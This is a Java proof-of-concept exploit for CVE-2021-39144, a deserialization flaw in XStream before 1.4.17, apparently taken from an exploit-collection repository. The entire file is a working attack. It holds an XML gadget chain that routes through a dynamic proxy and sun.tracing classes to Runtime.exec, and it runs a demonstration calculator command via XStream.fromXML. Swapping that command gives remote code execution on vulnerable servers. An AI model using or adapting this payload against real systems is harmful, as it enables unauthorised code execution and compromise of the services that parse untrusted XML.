package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * @author Whoopsunix
 * XStream < 1.4.17
 */
public class CVE_2021_39144 {
    public static void main(String[] args) {
        String payload = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>open -a Calculator.app</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
